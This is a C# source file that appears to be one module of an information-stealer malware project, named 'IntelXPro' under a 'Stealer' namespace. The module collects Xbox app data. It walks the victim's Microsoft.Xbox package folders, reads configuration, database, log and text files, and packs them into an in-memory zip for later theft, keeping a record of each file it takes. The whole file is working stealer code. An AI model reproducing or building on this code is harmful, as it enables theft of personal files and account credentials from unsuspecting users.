using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class XBox : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Packages");
            if (!Directory.Exists(path))
            {
                return;
            }
            string[] directories = Directory.GetDirectories(path, "Microsoft.Xbox*", SearchOption.TopDirectoryOnly);
            if (directories == null || directories.Length == 0)
            {
                return;
            }
            string[] source = new string[9] { ".ini", ".cfg", ".json", ".xml", ".log", ".dat", ".db", ".yaml", ".txt" };
            string[] array = directories;
            foreach (string text in array)
            {
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "Xbox";
                string[] files = Directory.GetFiles(text, "*.*", SearchOption.AllDirectories);
                foreach (string text2 in files)
                {
                    try
                    {
                        FileInfo fileInfo = new FileInfo(text2);
                        if (fileInfo.Length < 10000000 && source.Contains(fileInfo.Extension.ToLower()))
                        {
                            string path2 = text2.Substring(text.Length).TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
                            string text3 = Path.Combine("Xbox", Path.GetFileName(text), path2).Replace('\\', '/');
                            zip.AddFile(text3, File.ReadAllBytes(fileInfo.FullName));
                            counterApplications.Files.Add(fileInfo.FullName + " => " + text3);
                        }
                    }
                    catch
                    {
                    }
                }
                if (counterApplications.Files.Count > 0)
                {
                    counterApplications.Files.Add("Xbox\\");
                    counter.Games.Add(counterApplications);
                }
            }
        }
    }
}
